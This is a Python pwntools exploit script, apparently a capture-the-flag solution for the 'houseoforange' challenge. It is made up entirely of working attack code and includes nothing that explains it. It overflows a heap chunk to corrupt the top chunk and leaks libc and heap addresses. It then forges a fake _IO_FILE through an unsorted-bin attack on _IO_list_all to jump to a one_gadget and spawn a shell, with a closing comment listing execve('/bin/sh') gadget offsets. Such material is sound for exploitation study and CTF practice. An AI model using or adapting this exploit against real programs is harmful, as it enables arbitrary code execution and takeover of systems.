from pwn import *

p=process('./houseoforange')
elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level=1
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#one_gadget=0x45216
#one_gadget=0x4526A
#one_gadget=0xf02a4
one_gadget=0xf1147
IO_list_all=elf.symbols['_IO_list_all']

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Your choice : '

def add(size,content=''):
    sla(menu,'1')
    sla('Length of name :',str(size))
    sla('Name :',content)
    sla('Price of Orange:','2')
    sla('Color of Orange:',str(0xddaa))

def show():
    sla(menu,'2')


def edit(size,content):
    sla(menu,'3')
    sla('Length of name :',str(size))
    sla('Name:',content)
    sla('Price of Orange:','2')
    sla('Color of Orange:',str(0xddaa))



add(0x200)

payload='a'*0x200
payload+=p64(0)+p64(0x21)
payload+=p64(0x0000ddaa00000002)
payload+=p64(0)*2
payload+=p64(0xdb1)

edit(0x1111,payload)
add(0x1000)

add(0x400)
show()
rv('Name of house : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c510a

edit(17,'a'*16)
show()
rv('a'*16)
chunk_base=u64(p.recv(6)+2*'\x00')-0x20a

log.info('libc  base is:'+hex(libc_base))
log.info('chunk base is:'+hex(chunk_base))


payload='a'*0x400
payload+=p64(0)+p64(0x21)
payload+=p64(0xddaa00000002)
payload+=p64(0)*2
payload+=p64(0x61)
payload+=p64(0)+p64(libc_base+IO_list_all-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*21
payload+=p64(chunk_base+0x7c0)
payload+=p64(0)*3+p64(one_gadget+libc_base)

edit(0x1111,payload)
#gdb.attach(p,gdbscript='b __libc_message\nc')

sla(menu,'1')

p.interactive()



'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
